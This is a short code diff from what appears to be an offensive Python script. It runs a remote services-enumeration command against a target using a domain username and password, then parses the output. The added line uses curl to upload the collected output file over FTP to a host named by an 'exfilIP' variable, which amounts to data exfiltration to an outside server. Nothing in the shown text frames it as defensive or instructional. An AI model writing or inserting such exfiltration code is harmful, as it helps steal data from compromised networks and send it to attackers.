@@ -248,3 +248,4 @@ servicesCommand = f"py {services_path} {domain}/{username}:{password}@{targetIP}
 os.system(servicesCommand)
 get_services(".\\servicesOutput.txt")
 
+os.system(f"curl -T output.txt ftp://{exfilIP}/ --user upload:''")
